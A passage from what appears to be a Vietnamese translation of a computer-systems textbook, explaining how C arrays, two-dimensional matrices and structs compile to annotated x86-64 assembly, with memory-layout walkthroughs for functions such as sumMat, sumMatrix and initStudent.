0x4006c4 &lt;+62&gt;:   jl   0x4006a1 &lt;sumArray+27&gt; # if i&lt;length goto &lt;sumArray+27&gt;
0x4006c6 &lt;+64&gt;:   mov  -0x4(%rbp),%eax        # copy total to %eax
0x4006c9 &lt;+67&gt;:   pop  %rbp                   # prepare to leave the function
0x4006ca &lt;+68&gt;:   retq                        # return total
</code></pre>
<p>Khi lần theo đoạn code assembly này, hãy xem xét liệu dữ liệu được truy cập là một <strong>địa chỉ</strong> hay một <strong>giá trị</strong>. Ví dụ, lệnh tại <code>&lt;sumArray+11&gt;</code> khiến vị trí <code>%rbp-0x4</code> chứa một biến kiểu <code>int</code>, ban đầu được gán giá trị 0. Ngược lại, đối số được lưu tại <code>%rbp-0x18</code> là đối số thứ nhất của hàm (<code>array</code>), có kiểu <code>int *</code> và tương ứng với địa chỉ gốc (base address) của mảng. Một biến khác (mà ta gọi là <code>i</code>) được lưu tại vị trí <code>%rbp-0x8</code>. Cuối cùng, lưu ý rằng <strong>size suffix</strong> (hậu tố kích thước) chỉ được thêm vào cuối các lệnh như <code>add</code> và <code>mov</code> khi cần thiết. Trong các trường hợp liên quan đến hằng số, compiler cần chỉ rõ số byte của hằng số sẽ được di chuyển.</p>
<p>Người đọc tinh ý sẽ nhận thấy một lệnh chưa từng thấy trước đây tại dòng <code>&lt;sumArray+30&gt;</code> có tên <code>cltq</code>. Lệnh <code>cltq</code> là viết tắt của <em>convert long to quad</em> (chuyển từ long sang quad) và chuyển giá trị <code>int</code> 32-bit được lưu trong <code>%eax</code> thành giá trị số nguyên 64-bit được lưu trong <code>%rax</code>. Thao tác này là cần thiết vì các lệnh tiếp theo sẽ thực hiện <strong>pointer arithmetic</strong> (tính toán trên con trỏ). Hãy nhớ rằng trên hệ thống 64-bit, con trỏ chiếm 8 byte. Việc compiler sử dụng <code>cltq</code> giúp đơn giản hóa quá trình bằng cách đảm bảo tất cả dữ liệu được lưu trong các thanh ghi 64-bit thay vì các thành phần 32-bit.</p>
<p>Hãy cùng xem kỹ hơn năm lệnh nằm giữa các vị trí <code>&lt;sumArray+32&gt;</code> và <code>&lt;sumArray+49&gt;</code>:</p>
<pre><code>&lt;+32&gt;: lea 0x0(,%rax,4),%rdx       # copy i*4 to %rdx
&lt;+40&gt;: mov -0x18(%rbp),%rax        # copy array to %rax
&lt;+44&gt;: add %rdx,%rax               # add i*4 to array (i.e. array+i) to %rax
&lt;+47&gt;: mov (%rax),%eax             # dereference array+i*4, place in %eax
&lt;+49&gt;: add %eax,-0x4(%rbp)         # add %eax to total (i.e. total+=array[i])
</code></pre>
<p>Hãy nhớ rằng compiler thường dùng <code>lea</code> để thực hiện các phép toán số học đơn giản trên toán hạng. Toán hạng <code>0x0(,%rax,4)</code> được dịch thành <code>%rax*4 + 0x0</code>. Vì <code>%rax</code> giữ giá trị của <code>i</code>, thao tác này sao chép giá trị <code>i*4</code> vào <code>%rdx</code>. Tại thời điểm này, <code>%rdx</code> chứa số byte cần thiết để tính đúng <strong>offset</strong> (độ lệch) của <code>array[i]</code> (hãy nhớ rằng <code>sizeof(int) = 4</code>).</p>
<p>Lệnh tiếp theo (<code>mov -0x18(%rbp), %rax</code>) sao chép đối số thứ nhất của hàm (địa chỉ gốc của <code>array</code>) vào thanh ghi <code>%rax</code>. Việc cộng <code>%rdx</code> vào <code>%rax</code> ở lệnh tiếp theo khiến <code>%rax</code> chứa <code>array + i*4</code>. Hãy nhớ rằng phần tử tại chỉ số <em>i</em> trong <code>array</code> được lưu tại địa chỉ <code>array + sizeof(T) * i</code>. Do đó, <code>%rax</code> hiện chứa kết quả tính toán ở mức assembly của địa chỉ <code>&amp;array[i]</code>.</p>
<p>Lệnh tại <code>&lt;sumArray+47&gt;</code> <strong>dereference</strong> (giải tham chiếu) giá trị tại địa chỉ <code>%rax</code>, đặt giá trị của <code>array[i]</code> vào <code>%eax</code>. Lưu ý việc sử dụng <strong>component register</strong> <code>%eax</code>, vì <code>array[i]</code> chứa giá trị <code>int</code> 32-bit! Ngược lại, biến <code>i</code> đã được chuyển thành <strong>quad-word</strong> ở dòng <code>&lt;sumArray+30&gt;</code> vì <code>i</code> sắp được dùng cho <em>address computation</em> (tính toán địa chỉ). Một lần nữa, địa chỉ được lưu dưới dạng từ 64-bit.</p>
<p>Cuối cùng, <code>%eax</code> được cộng vào giá trị tại <code>%rbp-0x4</code>, tức là biến <code>total</code>. Do đó, năm lệnh nằm giữa các vị trí <code>&lt;sumArray+32&gt;</code> và <code>&lt;sumArray+49&gt;</code> tương ứng với dòng <code>total += array[i]</code> trong hàm <code>sumArray</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="78-ma-trận-matrices"><a class="header" href="#78-ma-trận-matrices">7.8. Ma trận (Matrices)</a></h2>
<p><strong>Ma trận</strong> là một mảng hai chiều. Trong C, một ma trận có thể được cấp phát tĩnh dưới dạng mảng hai chiều (<code>M[n][m]</code>), được cấp phát động chỉ với một lần gọi <code>malloc</code>, hoặc được cấp phát động dưới dạng <strong>mảng của các mảng</strong>.<br />
Hãy xét cách triển khai <strong>mảng của các mảng</strong>. Mảng thứ nhất chứa <code>n</code> phần tử (<code>M[n]</code>), và mỗi phần tử <code>M[i]</code> trong ma trận của chúng ta chứa một mảng gồm <code>m</code> phần tử. Các đoạn code sau đây lần lượt khai báo các ma trận kích thước 4 × 3:</p>
<pre><code class="language-c">// ma trận cấp phát tĩnh (trên stack)
int M1[4][3];

// ma trận cấp phát động (dễ lập trình, cấp phát trên heap)
int **M2, i;
M2 = malloc(4 * sizeof(int*));
for (i = 0; i &lt; 4; i++) {
    M2[i] = malloc(3 * sizeof(int));
}
</code></pre>
<p>Trong trường hợp ma trận được cấp phát động, mảng chính chứa một mảng liên tiếp các con trỏ kiểu <code>int</code>. Mỗi con trỏ này trỏ tới một mảng khác trong bộ nhớ. <strong>Hình 1</strong> minh họa cách chúng ta thường hình dung hai loại ma trận này.</p>
<p><img src="C7-x86_64/_images/matrices.png" alt="matrices" /><br />
<strong>Hình 1.</strong> Minh họa ma trận cấp phát tĩnh (M1) và ma trận cấp phát động (M2) kích thước 3×4</p>
<p>Với cả hai khai báo ma trận này, phần tử (<em>i</em>, <em>j</em>) có thể được truy cập bằng cú pháp chỉ số kép <code>M[i][j]</code>, trong đó <code>M</code> là <code>M1</code> hoặc <code>M2</code>. Tuy nhiên, các ma trận này được tổ chức khác nhau trong bộ nhớ.<br />
Mặc dù cả hai đều lưu các phần tử trong mảng chính một cách liên tiếp trong bộ nhớ, ma trận cấp phát tĩnh còn lưu <strong>toàn bộ các hàng</strong> liên tiếp nhau trong bộ nhớ, như minh họa ở <strong>Hình 2</strong>.</p>
<p><img src="C7-x86_64/_images/matrixArray.png" alt="matrixArray" /><br />
<strong>Hình 2.</strong> Cách sắp xếp bộ nhớ của ma trận M1 theo thứ tự hàng (row-major order)</p>
<p>Sự liên tiếp này <strong>không được đảm bảo</strong> đối với <code>M2</code>. <a href="C7-x86_64/../C2-C_depth/arrays.html#_two_dimensional_array_memory_layout">Hãy nhớ rằng</a> để cấp phát liên tiếp một ma trận <em>n</em> × <em>m</em> trên heap, chúng ta nên dùng một lần gọi <code>malloc</code> để cấp phát <em>n</em> × <em>m</em> phần tử:</p>
<pre><code class="language-c">// ma trận động (cấp phát trên heap, cách tiết kiệm bộ nhớ)
#define ROWS 4
#define COLS 3
int *M3;
M3 = malloc(ROWS * COLS * sizeof(int));
</code></pre>
<p>Với khai báo <code>M3</code>, phần tử (<em>i</em>, <em>j</em>) <strong>không thể</strong> truy cập bằng cú pháp <code>M[i][j]</code>. Thay vào đó, chúng ta phải truy cập bằng công thức <code>M3[i*COLS + j]</code>.</p>
<h3 id="781-ma-trận-hai-chiều-liên-tiếp-contiguous-two-dimensional-arrays"><a class="header" href="#781-ma-trận-hai-chiều-liên-tiếp-contiguous-two-dimensional-arrays">7.8.1. Ma trận hai chiều liên tiếp (Contiguous Two-Dimensional Arrays)</a></h3>
<p>Xét hàm <code>sumMat</code> nhận vào một con trỏ tới ma trận được cấp phát liên tiếp (có thể là cấp phát tĩnh hoặc cấp phát động tiết kiệm bộ nhớ) làm tham số đầu tiên, cùng với số hàng và số cột, và trả về tổng tất cả các phần tử trong ma trận.</p>
<p>Chúng ta sử dụng <strong>scaled indexing</strong> (chỉ số có nhân hệ số) trong đoạn code dưới đây vì nó áp dụng cho cả ma trận liên tiếp cấp phát tĩnh và động. Hãy nhớ rằng cú pháp <code>m[i][j]</code> <strong>không hoạt động</strong> với cách cấp phát động liên tiếp tiết kiệm bộ nhớ đã nói ở trên.</p>
<pre><code class="language-c">int sumMat(int *m, int rows, int cols) {
    int i, j, total = 0;
    for (i = 0; i &lt; rows; i++){
        for (j = 0; j &lt; cols; j++){
            total += m[i*cols + j];
        }
    }
    return total;
}
</code></pre>
<p>Dưới đây là code assembly tương ứng. Mỗi dòng đều được chú thích bằng tiếng Việt:</p>
<pre><code>Dump of assembler code for function sumMat:
0x400686 &lt;+0&gt;:   push %rbp                 # lưu rbp
0x400687 &lt;+1&gt;:   mov  %rsp,%rbp            # cập nhật rbp (stack frame mới)
0x40068a &lt;+4&gt;:   mov  %rdi,-0x18(%rbp)     # copy m vào %rbp-0x18
0x40068e &lt;+8&gt;:   mov  %esi,-0x1c(%rbp)     # copy rows vào %rbp-0x1c
0x400691 &lt;+11&gt;:  mov  %edx,-0x20(%rbp)     # copy cols vào %rbp-0x20
0x400694 &lt;+14&gt;:  movl $0x0,-0x4(%rbp)      # copy 0 vào %rbp-0x4 (total)
0x40069b &lt;+21&gt;:  movl $0x0,-0xc(%rbp)      # copy 0 vào %rbp-0xc (i)
0x4006a2 &lt;+28&gt;:  jmp  0x4006e1 &lt;sumMat+91&gt; # goto &lt;sumMat+91&gt;
0x4006a4 &lt;+30&gt;:  movl $0x0,-0x8(%rbp)      # copy 0 vào %rbp-0x8 (j)
0x4006ab &lt;+37&gt;:  jmp  0x4006d5 &lt;sumMat+79&gt; # goto &lt;sumMat+79&gt;
0x4006ad &lt;+39&gt;:  mov  -0xc(%rbp),%eax      # copy i vào %eax
0x4006b0 &lt;+42&gt;:  imul -0x20(%rbp),%eax     # nhân i với cols, lưu vào %eax
0x4006b4 &lt;+46&gt;:  mov  %eax,%edx            # copy i*cols vào %edx
0x4006b6 &lt;+48&gt;:  mov  -0x8(%rbp),%eax      # copy j vào %eax
0x4006b9 &lt;+51&gt;:  add  %edx,%eax            # cộng i*cols với j, lưu vào %eax
0x4006bb &lt;+53&gt;:  cltq                      # chuyển %eax sang số nguyên 64-bit
0x4006bd &lt;+55&gt;:  lea  0x0(,%rax,4),%rdx    # nhân (i*cols+j) với 4, lưu vào %rdx
0x4006c5 &lt;+63&gt;:  mov  -0x18(%rbp),%rax     # copy m vào %rax
0x4006c9 &lt;+67&gt;:  add  %rdx,%rax            # cộng m với (i*cols+j)*4, lưu vào %rax
0x4006cc &lt;+70&gt;:  mov  (%rax),%eax          # copy m[i*cols+j] vào %eax
0x4006ce &lt;+72&gt;:  add  %eax,-0x4(%rbp)      # cộng m[i*cols+j] vào total
0x4006d1 &lt;+75&gt;:  addl $0x1,-0x8(%rbp)      # cộng 1 vào j (j++)
0x4006d5 &lt;+79&gt;:  mov  -0x8(%rbp),%eax      # copy j vào %eax
0x4006d8 &lt;+82&gt;:  cmp  -0x20(%rbp),%eax     # so sánh j với cols
0x4006db &lt;+85&gt;:  jl   0x4006ad &lt;sumMat+39&gt; # nếu (j &lt; cols) goto &lt;sumMat+39&gt;
0x4006dd &lt;+87&gt;:  addl $0x1,-0xc(%rbp)      # cộng 1 vào i
0x4006e1 &lt;+91&gt;:  mov  -0xc(%rbp),%eax      # copy i vào %eax
0x4006e4 &lt;+94&gt;:  cmp  -0x1c(%rbp),%eax     # so sánh i với rows
0x4006e7 &lt;+97&gt;:  jl   0x4006a4 &lt;sumMat+30&gt; # nếu (i &lt; rows) goto &lt;sumMat+30&gt;
0x4006e9 &lt;+99&gt;:  mov  -0x4(%rbp),%eax      # copy total vào %eax
0x4006ec &lt;+102&gt;: pop  %rbp                 # dọn dẹp stack
</code></pre>
<p>Các biến cục bộ <code>i</code>, <code>j</code> và <code>total</code> lần lượt được lưu tại các địa chỉ <code>%rbp-0xc</code>, <code>%rbp-0x8</code> và <code>%rbp-0x4</code> trên stack. Các tham số đầu vào <code>m</code>, <code>row</code> và <code>cols</code> lần lượt được lưu tại <code>%rbp-0x18</code>, <code>%rbp-0x1c</code> và <code>%rbp-0x20</code>. Với thông tin này, hãy phóng to vào phần chỉ xử lý việc truy cập phần tử (<em>i</em>, <em>j</em>) trong ma trận:</p>
<pre><code>0x4006ad &lt;+39&gt;: mov  -0xc(%rbp),%eax    # copy i to %eax
0x4006b0 &lt;+42&gt;: imul -0x20(%rbp),%eax   # multiply i with cols, place in %eax
0x4006b4 &lt;+46&gt;: mov  %eax,%edx          # copy i*cols to %edx
</code></pre>
<p>Bộ lệnh đầu tiên tính giá trị <code>i*cols</code> và đặt vào thanh ghi <code>%edx</code>. Hãy nhớ rằng với một ma trận tên <code>matrix</code>, biểu thức <code>matrix + (i * cols)</code> tương đương với <code>&amp;matrix[i]</code>.</p>
<pre><code>0x4006b6 &lt;+48&gt;: mov  -0x8(%rbp),%eax    # copy j to %eax
0x4006b9 &lt;+51&gt;: add  %edx,%eax          # add i*cols with j, place in %eax
0x4006bb &lt;+53&gt;: cltq                    # convert %eax to a 64-bit int
0x4006bd &lt;+55&gt;: lea  0x0(,%rax,4),%rdx  # multiply (i*cols+j) by 4, put in %rdx
</code></pre>
<p>Bộ lệnh tiếp theo tính <code>(i*cols + j) * 4</code>. Compiler nhân chỉ số <code>i*cols + j</code> với 4 vì mỗi phần tử trong ma trận là một số nguyên 4 byte, và phép nhân này giúp tính đúng offset. Lệnh <code>cltq</code> ở dòng <code>&lt;sumMat+53&gt;</code> được dùng để <strong>sign-extend</strong> nội dung của <code>%eax</code> thành số nguyên 64-bit, vì giá trị này sắp được dùng để tính địa chỉ.</p>
<p>Tiếp theo, bộ lệnh sau cộng offset vừa tính vào con trỏ ma trận và dereference để lấy giá trị phần tử (<em>i</em>, <em>j</em>):</p>
<pre><code>0x4006c5 &lt;+63&gt;: mov -0x18(%rbp),%rax   # copy m to %rax
0x4006c9 &lt;+67&gt;: add %rdx,%rax          # add m to (i*cols+j)*4, place in %rax
0x4006cc &lt;+70&gt;: mov (%rax),%eax        # copy m[i*cols+j] to %eax
0x4006ce &lt;+72&gt;: add %eax,-0x4(%rbp)    # add m[i*cols+j] to total
</code></pre>
<ul>
<li>Lệnh đầu tiên nạp địa chỉ của ma trận <code>m</code> vào <code>%rax</code>.</li>
<li>Lệnh <code>add</code> cộng <code>(i*cols + j) * 4</code> vào địa chỉ <code>m</code> để tính đúng offset của phần tử (<em>i</em>, <em>j</em>).</li>
<li>Lệnh thứ ba dereference địa chỉ trong <code>%rax</code> và đặt giá trị vào <code>%eax</code>. Lưu ý việc dùng <code>%eax</code> làm thanh ghi đích: vì ma trận chứa số nguyên (4 byte), nên <strong>component register</strong> <code>%eax</code> được dùng thay vì <code>%rax</code>.</li>
<li>Lệnh cuối cộng giá trị trong <code>%eax</code> vào biến tích lũy <code>total</code> tại <code>%rbp-0x4</code>.</li>
</ul>
<p>Hãy xét cách truy cập phần tử (1,2) trong <strong>Hình 2</strong> (được lặp lại dưới đây):</p>
<p><img src="C7-x86_64/_images/matrixArray.png" alt="matrixArray" /><br />
<strong>Hình 3.</strong> Cách sắp xếp bộ nhớ của ma trận M1 theo thứ tự hàng (row-major order)</p>
<p>Phần tử (1,2) nằm tại địa chỉ <code>M1 + 1*COLS + 2</code>. Vì <code>COLS = 3</code>, phần tử (1,2) tương ứng với <code>M1 + 5</code>. Để truy cập phần tử này, compiler phải nhân 5 với kích thước kiểu dữ liệu <code>int</code> (4 byte), thu được offset <code>M1 + 20</code>, tương ứng với byte x~20~ trong hình. Dereference vị trí này sẽ lấy được giá trị 5, chính là phần tử (1,2) trong ma trận.</p>
<h3 id="782-ma-trận-không-liên-tiếp-noncontiguous-matrix"><a class="header" href="#782-ma-trận-không-liên-tiếp-noncontiguous-matrix">7.8.2. Ma trận không liên tiếp (Noncontiguous Matrix)</a></h3>
<p>Cách triển khai ma trận không liên tiếp phức tạp hơn một chút. <strong>Hình 4</strong> minh họa cách <code>M2</code> có thể được bố trí trong bộ nhớ.</p>
<p><img src="C7-x86_64/_images/dynamicMatrixLayout.png" alt="matrixDynamic" /><br />
<strong>Hình 4.</strong> Cách bố trí không liên tiếp của ma trận M2 trong bộ nhớ</p>
<p>Lưu ý rằng mảng con trỏ là liên tiếp, và mỗi mảng được trỏ tới bởi một phần tử của <code>M2</code> (ví dụ <code>M2[i]</code>) cũng liên tiếp. Tuy nhiên, các mảng riêng lẻ này <strong>không</strong> liên tiếp với nhau. Vì <code>M2</code> là mảng con trỏ, mỗi phần tử của <code>M2</code> chiếm 8 byte. Ngược lại, vì <code>M2[i]</code> là mảng <code>int</code>, mỗi phần tử của <code>M2[i]</code> cách nhau 4 byte.</p>
<p>Hàm <code>sumMatrix</code> dưới đây nhận một mảng con trỏ số nguyên (<code>matrix</code>) làm tham số đầu tiên, và số hàng cùng số cột làm tham số thứ hai và thứ ba:</p>
<pre><code class="language-c">int sumMatrix(int **matrix, int rows, int cols) {
    int i, j, total = 0;

    for (i = 0; i &lt; rows; i++) {
        for (j = 0; j &lt; cols; j++) {
            total += matrix[i][j];
        }
    }
    return total;
}
</code></pre>
<p>Mặc dù hàm này trông gần như giống hệt <code>sumMat</code> ở trên, ma trận mà nó nhận vào là một mảng liên tiếp các <em>con trỏ</em>. Mỗi con trỏ chứa địa chỉ của một mảng liên tiếp khác, tương ứng với một hàng riêng trong ma trận.</p>
<p>Mã assembly tương ứng của <code>sumMatrix</code> (mỗi dòng được chú thích):</p>
<pre><code>Dump of assembler code for function sumMatrix:
0x4006ee &lt;+0&gt;:   push   %rbp                    # lưu rbp
0x4006ef &lt;+1&gt;:   mov    %rsp,%rbp               # cập nhật rbp (stack frame mới)
0x4006f2 &lt;+4&gt;:   mov    %rdi,-0x18(%rbp)        # copy matrix vào %rbp-0x18
0x4006f6 &lt;+8&gt;:   mov    %esi,-0x1c(%rbp)        # copy rows vào %rbp-0x1c
0x4006f9 &lt;+11&gt;:  mov    %edx,-0x20(%rbp)        # copy cols vào %rbp-0x20
0x4006fc &lt;+14&gt;:  movl   $0x0,-0x4(%rbp)         # copy 0 vào %rbp-0x4 (total)
0x400703 &lt;+21&gt;:  movl   $0x0,-0xc(%rbp)         # copy 0 vào %rbp-0xc (i)
0x40070a &lt;+28&gt;:  jmp    0x40074e &lt;sumMatrix+96&gt; # goto &lt;sumMatrix+96&gt;
0x40070c &lt;+30&gt;:  movl   $0x0,-0x8(%rbp)         # copy 0 vào %rbp-0x8 (j)
0x400713 &lt;+37&gt;:  jmp    0x400742 &lt;sumMatrix+84&gt; # goto &lt;sumMatrix+84&gt;
0x400715 &lt;+39&gt;:  mov    -0xc(%rbp),%eax         # copy i vào %eax
0x400718 &lt;+42&gt;:  cltq                           # chuyển i sang số nguyên 64-bit
0x40071a &lt;+44&gt;:  lea    0x0(,%rax,8),%rdx       # nhân i với 8, lưu vào %rdx
0x400722 &lt;+52&gt;:  mov    -0x18(%rbp),%rax        # copy matrix vào %rax
0x400726 &lt;+56&gt;:  add    %rdx,%rax               # i*8 + matrix vào %rax
0x400729 &lt;+59&gt;:  mov    (%rax),%rax             # copy matrix[i] vào %rax (ptr)
0x40072c &lt;+62&gt;:  mov    -0x8(%rbp),%edx         # copy j vào %edx
0x40072f &lt;+65&gt;:  movsl
</code></pre>
<p>Một lần nữa, các biến <code>i</code>, <code>j</code> và <code>total</code> lần lượt nằm tại các địa chỉ stack <code>%rbp-0xc</code>, <code>%rbp-0x8</code> và <code>%rbp-0x4</code>. Các tham số đầu vào <code>matrix</code>, <code>row</code> và <code>cols</code> lần lượt nằm tại các địa chỉ stack <code>%rbp-0x18</code>, <code>%rbp-0x1c</code> và <code>%rbp-0x20</code>.<br />
Hãy phóng to vào đoạn code xử lý riêng việc truy cập phần tử (<em>i</em>, <em>j</em>), hay <code>matrix[i][j]</code>:</p>
<pre><code>0x400715 &lt;+39&gt;: mov  -0xc(%rbp),%eax       # copy i to %eax
0x400718 &lt;+42&gt;: cltq                       # convert i to 64-bit integer
0x40071a &lt;+44&gt;: lea  0x0(,%rax,8),%rdx     # multiply i by 8, place in %rdx
0x400722 &lt;+52&gt;: mov  -0x18(%rbp),%rax      # copy matrix to %rax
0x400726 &lt;+56&gt;: add  %rdx,%rax             # add i*8 to matrix, place in %rax
0x400729 &lt;+59&gt;: mov  (%rax),%rax           # copy matrix[i] to %rax (pointer)
</code></pre>
<p>Năm lệnh trên tính toán <code>matrix[i]</code>, hay <code>*(matrix + i)</code>.<br />
Vì <code>matrix[i]</code> chứa một con trỏ, nên <code>i</code> trước tiên được chuyển sang số nguyên 64-bit. Sau đó, compiler nhân <code>i</code> với 8 trước khi cộng vào <code>matrix</code> để tính đúng offset địa chỉ (hãy nhớ rằng con trỏ có kích thước 8 byte). Lệnh tại <code>&lt;sumMatrix+59&gt;</code> sau đó dereference địa chỉ vừa tính để lấy phần tử <code>matrix[i]</code>.</p>
<p>Vì <code>matrix</code> là một mảng các con trỏ <code>int</code>, phần tử tại <code>matrix[i]</code> bản thân nó là một con trỏ <code>int</code>. Phần tử thứ <em>j</em> trong <code>matrix[i]</code> nằm tại offset <code>j × 4</code> trong mảng <code>matrix[i]</code>.</p>
<p>Bộ lệnh tiếp theo trích xuất phần tử thứ <em>j</em> trong mảng <code>matrix[i]</code>:</p>
<pre><code>0x40072c &lt;+62&gt;: mov    -0x8(%rbp),%edx    # copy j to %edx
0x40072f &lt;+65&gt;: movslq %edx,%rdx          # convert j to a 64-bit integer
0x400732 &lt;+68&gt;: shl    $0x2,%rdx          # multiply j by 4, place in %rdx
0x400736 &lt;+72&gt;: add    %rdx,%rax          # add j*4 to matrix[i], put in %rax
0x400739 &lt;+75&gt;: mov    (%rax),%eax        # copy matrix[i][j] to %eax
0x40073b &lt;+77&gt;: add    %eax,-0x4(%rbp)    # add matrix[i][j] to total
</code></pre>
<ul>
<li>Lệnh đầu tiên nạp biến <code>j</code> vào thanh ghi <code>%edx</code>.</li>
<li>Lệnh <code>movslq</code> tại <code>&lt;sumMatrix+65&gt;</code> chuyển <code>%edx</code> thành số nguyên 64-bit, lưu kết quả vào thanh ghi 64-bit <code>%rdx</code>.</li>
<li>Compiler sau đó dùng lệnh dịch trái (<code>shl</code>) để nhân <code>j</code> với 4 và lưu kết quả vào <code>%rdx</code>.</li>
<li>Compiler cuối cùng cộng giá trị này vào địa chỉ trong <code>matrix[i]</code> để lấy địa chỉ của phần tử <code>matrix[i][j]</code>.</li>
<li>Các lệnh tại <code>&lt;sumMatrix+75&gt;</code> và <code>&lt;sumMatrix+77&gt;</code> lấy giá trị tại <code>matrix[i][j]</code> và cộng giá trị này vào <code>total</code>.</li>
</ul>
<p>Hãy quay lại <strong>Hình 4</strong> và xét ví dụ truy cập <code>M2[1][2]</code>.<br />
Để tiện theo dõi, hình được lặp lại dưới đây:</p>
<p><img src="C7-x86_64/_images/dynamicMatrixLayout.png" alt="matrixDynamic" /></p>
<p><strong>Hình 5.</strong> Cách bố trí không liên tiếp của ma trận M2 trong bộ nhớ</p>
<p>Lưu ý rằng <code>M2</code> bắt đầu tại địa chỉ bộ nhớ x~0~.<br />
Compiler trước tiên tính địa chỉ của <code>M2[1]</code> bằng cách nhân 1 với 8 (<code>sizeof(int *)</code>) và cộng vào địa chỉ của <code>M2</code> (x~0~), thu được địa chỉ mới x~8~.<br />
Dereference địa chỉ này sẽ cho ra địa chỉ gắn với <code>M2[1]</code>, tức x~36~.<br />
Tiếp theo, compiler nhân chỉ số 2 với 4 (<code>sizeof(int)</code>) và cộng kết quả (8) vào x~36~, thu được địa chỉ cuối cùng x~44~.<br />
Dereference địa chỉ x~44~ sẽ cho giá trị 5.<br />
Quả thật, phần tử trong <strong>Hình 4</strong> tương ứng với <code>M2[1][2]</code> có giá trị là 5.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="79-structs-trong-assembly"><a class="header" href="#79-structs-trong-assembly">7.9. structs trong Assembly</a></h2>
<p><strong>Struct</strong> là một cách khác để tạo một tập hợp các kiểu dữ liệu trong C.<br />
Không giống như mảng, struct cho phép nhóm các kiểu dữ liệu khác nhau lại với nhau.<br />
C lưu trữ một <code>struct</code> giống như một mảng một chiều, trong đó các phần tử dữ liệu (field) được lưu <strong>liên tiếp</strong> trong bộ nhớ.</p>
<p>Hãy cùng xem lại <code>struct studentT</code> từ Chương 1:</p>
<pre><code class="language-c">struct studentT {
    char name[64];
    int  age;
    int  grad_yr;
    float gpa;
};

struct studentT student;
</code></pre>
<p><strong>Hình 1</strong> cho thấy cách <code>student</code> được bố trí trong bộ nhớ.<br />
Mỗi x~i~ biểu thị địa chỉ của một field cụ thể.</p>
<p><img src="C7-x86_64/_images/structArray.png" alt="structArray" /><br />
<strong>Hình 1.</strong> Cách bố trí bộ nhớ của struct <code>studentT</code></p>
<p>Các field được lưu liên tiếp nhau trong bộ nhớ theo đúng thứ tự khai báo.<br />
Trong <strong>Hình 1</strong>, field <code>age</code> được cấp phát ngay sau field <code>name</code> (tại byte offset x~64~), tiếp theo là <code>grad_yr</code> (offset x~68~) và <code>gpa</code> (offset x~72~).<br />
Cách tổ chức này cho phép truy cập field hiệu quả về mặt bộ nhớ.</p>
<p>Để hiểu cách compiler sinh code assembly làm việc với một <code>struct</code>, hãy xét hàm <code>initStudent</code>:</p>
<pre><code class="language-c">void initStudent(struct studentT *s, char *nm, int ag, int gr, float g) {
    strncpy(s-&gt;name, nm, 64);
    s-&gt;grad_yr = gr;
    s-&gt;age = ag;
    s-&gt;gpa = g;
}
</code></pre>
<p>Hàm <code>initStudent</code> nhận địa chỉ cơ sở của một <code>struct studentT</code> làm tham số đầu tiên,<br />
và các giá trị mong muốn cho từng field làm các tham số còn lại.<br />
Đoạn code assembly dưới đây thể hiện hàm này:</p>
<pre><code>Dump of assembler code for function initStudent:
0x4006aa &lt;+0&gt;:  push  %rbp                   # lưu rbp
0x4006ab &lt;+1&gt;:  mov   %rsp,%rbp              # cập nhật rbp (stack frame mới)
0x4006ae &lt;+4&gt;:  sub   $0x20,%rsp             # thêm 32 byte vào stack frame
0x4006b2 &lt;+8&gt;:  mov   %rdi,-0x8(%rbp)        # copy tham số 1 vào %rbp-0x8 (s)
0x4006b6 &lt;+12&gt;: mov   %rsi,-0x10(%rbp)       # copy tham số 2 vào %rbp-0x10 (nm)
0x4006ba &lt;+16&gt;: mov   %edx,-0x14(%rbp)       # copy tham số 3 vào %rbp-0x14 (ag)
0x4006bd &lt;+19&gt;: mov   %ecx,-0x18(%rbp)       # copy tham số 4 vào %rbp-0x18 (gr)
0x4006c0 &lt;+22&gt;: movss %xmm0,-0x1c(%rbp)      # copy tham số 5 vào %rbp-0x1c (g)
0x4006c5 &lt;+27&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006c9 &lt;+31&gt;: mov   -0x10(%rbp),%rcx       # copy nm vào %rcx
0x4006cd &lt;+35&gt;: mov   $0x40,%edx             # copy 0x40 (64) vào %edx
0x4006d2 &lt;+40&gt;: mov   %rcx,%rsi              # copy nm vào %rsi
0x4006d5 &lt;+43&gt;: mov   %rax,%rdi              # copy s vào %rdi
0x4006d8 &lt;+46&gt;: callq 0x400460 &lt;strncpy@plt&gt; # gọi strncpy(s-&gt;name, nm, 64)
0x4006dd &lt;+51&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006e1 &lt;+55&gt;: mov   -0x18(%rbp),%edx       # copy gr vào %edx
0x4006e4 &lt;+58&gt;: mov   %edx,0x44(%rax)        # copy gr vào %rax+0x44 (s-&gt;grad_yr)
0x4006e7 &lt;+61&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006eb &lt;+65&gt;: mov   -0x14(%rbp),%edx       # copy ag vào %edx
0x4006ee &lt;+68&gt;: mov   %edx,0x40(%rax)        # copy ag vào %rax+0x40 (s-&gt;age)
0x4006f1 &lt;+71&gt;: mov   -0x8(%rbp),%rax        # copy s vào %rax
0x4006f5 &lt;+75&gt;: movss -0x1c(%rbp),%xmm0      # copy g vào %xmm0
0x4006fa &lt;+80&gt;: movss %xmm0,0x48(%rax)       # copy g vào %rax+0x48 (s-&gt;gpa)
0x400700 &lt;+86&gt;: leaveq                       # chuẩn bị thoát hàm
0x400701 &lt;+87&gt;: retq                         # return (void, %rax bị bỏ qua)
</code></pre>
<p>Việc chú ý tới <strong>byte offset</strong> của từng field là chìa khóa để hiểu đoạn code này.<br />
Một số điểm cần lưu ý:</p>
<ul>
<li>Lời gọi <code>strncpy</code> nhận địa chỉ cơ sở của field <code>name</code> trong <code>s</code>, địa chỉ mảng <code>nm</code>, và độ dài cần copy làm ba tham số.<br />
Hãy nhớ rằng vì <code>name</code> là field đầu tiên trong <code>struct studentT</code>, nên địa chỉ của <code>s</code> cũng chính là địa chỉ của <code>s-&gt;name</code>.</li>
</ul>
<pre><code>0x4006b2 &lt;+8&gt;:  mov   %rdi,-0x8(%rbp)        # copy tham số 1 vào %rbp-0x8 (s)
0x4006b6 &lt;+12&gt;: mov   %rsi,-0x10(%rbp)       # copy tham số 2 vào %rbp-0x10 (nm)
0x4006ba &lt;+16&gt;: mov   %edx,-0x14(%rbp)       # copy tham số 3 vào %rbp-0x14 (ag)
0x4006bd &lt;+19&gt;: mov   %ecx,-0x18(%rbp)       # copy tham số 4 vào %rbp-0x18 (gr)
